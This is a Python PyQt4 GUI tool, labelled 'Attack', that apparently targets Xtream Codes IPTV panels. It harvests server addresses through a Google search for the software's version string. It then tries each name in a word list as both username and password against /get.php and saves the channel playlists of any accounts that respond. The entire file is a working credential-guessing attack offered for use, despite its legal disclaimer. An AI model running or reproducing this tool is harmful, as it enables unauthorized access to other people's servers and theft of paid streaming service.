#!/usr/bin/python
#-*- coding: utf-8 -*-

#########################################################################
#  This program is free software; you can redistribute it and/or modify #
#  it under the terms of the GNU General Public License as published by #
#  the Free Software Foundation; either version 2 of the License, or    #
#  (at your option) any later version.                                  #
#                                                                       #
#  This program is distributed in the hope that it will be useful,      #
#  but WITHOUT ANY WARRANTY; without even the implied warranty of       #
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        #
#  GNU General Public License for more details.                         #
#                                                                       #
#  You should have received a copy of the GNU General Public License    #
#  along with this program; if not, write to the Free Software          #
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,           #
#  MA 02110-1301, USA.                                                  #
############################# DISCALIMER ################################
#  Usage of this software for probing/attacking targets without prior   #
#  mutual consent, is illegal. It's the end user's responsability to    #
#  obey alla applicable local laws. Developers assume no liability and  #
#  are not responible for any missue or damage caused by thi program    #
#########################################################################

#by Pinperepette - The Pirate

from PyQt4 import QtCore, QtGui
import urllib2
import google
import os
import time
import sys
from urlparse import urlparse

try:
    _fromUtf8 = QtCore.QString.fromUtf8
except AttributeError:
    def _fromUtf8(s):
        return s

try:
    _encoding = QtGui.QApplication.UnicodeUTF8
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig, _encoding)
except AttributeError:
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig)

#Parameters
search = "Xtream Codes v1.0.59.5"
names = "names.txt"
directory = "output"
msg = ""
link = []
for url in google.search(search, num = 1000, stop = 1):
    parsed = urlparse(url)
    link.append(parsed.scheme + "://" + parsed.netloc)


class Ui_Form(QtGui.QWidget):
    def __init__(self, parent=None):
        QtGui.QWidget.__init__(self, parent)
    def setupUi(self, Form):
        Form.setObjectName(_fromUtf8("Form"))
        Form.resize(478, 259)
        self.gridLayout = QtGui.QGridLayout(Form)
        self.gridLayout.setObjectName(_fromUtf8("gridLayout"))

        self.terminal = QtGui.QListWidget(Form)
        self.terminal.setObjectName(_fromUtf8("terminal"))
        self.terminal.setStyleSheet(_fromUtf8("color: rgb(0, 220, 67);\n" "background-color:rgb(4, 4, 4)"))
        self.gridLayout.addWidget(self.terminal, 6, 0, 1, 3)
        self.lineEdit = QtGui.QLineEdit(Form)
        self.lineEdit.setObjectName(_fromUtf8("lineEdit"))
        self.gridLayout.addWidget(self.lineEdit, 2, 1, 1, 1)
        self.label_2 = QtGui.QLabel(Form)
        self.label_2.setObjectName(_fromUtf8("label_2"))
        self.gridLayout.addWidget(self.label_2, 2, 0, 1, 1)

        self.pushButton_2 = QtGui.QPushButton(Form)
        self.pushButton_2.setObjectName(_fromUtf8("pushButton_2"))
        self.connect(self.pushButton_2, QtCore.SIGNAL("released()"), self.test)

        self.gridLayout.addWidget(self.pushButton_2, 2, 2, 1, 1)
        self.comboBox = QtGui.QComboBox(Form)
        self.comboBox.setObjectName(_fromUtf8("comboBox"))
        self.comboBox.addItems(link)
        self.gridLayout.addWidget(self.comboBox, 0, 0, 1, 3)
        self.line_2 = QtGui.QFrame(Form)
        self.line_2.setFrameShape(QtGui.QFrame.HLine)
        self.line_2.setFrameShadow(QtGui.QFrame.Sunken)
        self.line_2.setObjectName(_fromUtf8("line_2"))
        self.gridLayout.addWidget(self.line_2, 3, 0, 1, 3)
        self.line = QtGui.QFrame(Form)
        self.line.setFrameShape(QtGui.QFrame.HLine)
        self.line.setFrameShadow(QtGui.QFrame.Sunken)
        self.line.setObjectName(_fromUtf8("line"))
        self.gridLayout.addWidget(self.line, 1, 0, 1, 3)

        self.threadPool = []

        self.retranslateUi(Form)
        QtCore.QObject.connect(self.comboBox, QtCore.SIGNAL(_fromUtf8("currentIndexChanged(QString)")), self.lineEdit.setText)
        QtCore.QMetaObject.connectSlotsByName(Form)

    def retranslateUi(self, Form):
        Form.setWindowTitle(_translate("Form", "IPTV", None))
        self.label_2.setText(_translate("Form", "TARGET :", None))
        self.pushButton_2.setText(_translate("Form", "Attack", None))

    def add(self, text):
        self.terminal.addItem(text)
        self.terminal.sortItems()

    def addBatch2(self,text="test",iters=6,delay=0.3):
        global msg
        global URL
        URL = str(self.lineEdit.text())
        if URL == "":
            msg = "select a target"
            self.threadPool.append( WorkThread() )
            self.connect( self.threadPool[len(self.threadPool)-1], QtCore.SIGNAL("update(QString)"), self.add )
            self.threadPool[len(self.threadPool)-1].start()
        else:
            msg = ("Attack URL:  " + URL )
            self.threadPool.append( WorkThread() )
            self.connect( self.threadPool[len(self.threadPool)-1], QtCore.SIGNAL("update(QString)"), self.add )
            self.threadPool[len(self.threadPool)-1].start()
            time.sleep(delay)
            rows = open(names , "r")
            NR = len(rows.readlines())
            TT = (str(NR))
            n = NR
            msg = ("the list contains " + TT + " elements")
            self.threadPool.append( WorkThread() )
            self.connect( self.threadPool[len(self.threadPool)-1], QtCore.SIGNAL("update(QString)"), self.add )
            self.threadPool[len(self.threadPool)-1].start()
            time.sleep(delay)
            tr = 0
            with open(names) as f:
                content = f.readlines()
                for r in content:
                    req = urllib2.Request( URL + "/get.php?username=%s&password=%s&type=m3u&output=mpegts" % (r.rstrip().lstrip(), r.rstrip().lstrip()))
                    response = urllib2.urlopen(req)
                    the_page = response.read()
                    NR = (NR - 1)
                    TM = (str(NR))
                    msg = ("request for name: " + r.rstrip().lstrip())
                    self.threadPool.append( WorkThread() )
                    self.connect( self.threadPool[len(self.threadPool)-1], QtCore.SIGNAL("update(QString)"), self.add )
                    self.threadPool[len(self.threadPool)-1].start()
                    time.sleep(delay)
                    if len(the_page) > 0:
                        tr = (tr + 1)
                        msg = "account found !!! "
                        self.threadPool.append( WorkThread() )
                        self.connect( self.threadPool[len(self.threadPool)-1], QtCore.SIGNAL("update(QString)"), self.add )
                        self.threadPool[len(self.threadPool)-1].start()
                        time.sleep(delay)
                        new_path = directory + "/" + URL.replace("http://", "")
                        if os.path.exists(new_path) is False:
                            os.makedirs(new_path)
                        out_file = open(str(new_path) + "/tv_channels_%s.m3u" % r.rstrip().lstrip(), "w")
                        out_file.write(the_page)
                        out_file.close()
                trov = (str(tr))
                msg = ("Accounts found: " + trov)
                self.threadPool.append( WorkThread() )
                self.connect( self.threadPool[len(self.threadPool)-1], QtCore.SIGNAL("update(QString)"), self.add )
                self.threadPool[len(self.threadPool)-1].start()
                time.sleep(delay)
        #for i in range(iters):
            #time.sleep(delay)
            #self.emit( QtCore.SIGNAL('add(QString)'), text+" "+str(i) )

    def test(self):
        self.threadPool.append( GenericThread(self.addBatch2,msg,delay=0.3) )
        self.disconnect( self, QtCore.SIGNAL("add(QString)"), self.add )
        self.connect( self, QtCore.SIGNAL("add(QString)"), self.add )
        self.threadPool[len(self.threadPool)-1].start()

class WorkThread(QtCore.QThread):
    def __init__(self):
        QtCore.QThread.__init__(self)

    def __del__(self):
        self.wait()

    def run(self):
        for i in range(6):
            time.sleep(0.3)
            self.emit( QtCore.SIGNAL('update(QString)'), msg )
            return

class GenericThread(QtCore.QThread):
    def __init__(self, function, *args, **kwargs):
        QtCore.QThread.__init__(self)
        self.function = function
        self.args = args
        self.kwargs = kwargs

    def __del__(self):
        self.wait()

    def run(self):
        self.function(*self.args,**self.kwargs)
        return

if __name__ == "__main__":
    import sys
    app = QtGui.QApplication(sys.argv)
    Form = QtGui.QWidget()
    ui = Ui_Form()
    ui.setupUi(Form)
    Form.show()
    sys.exit(app.exec_())
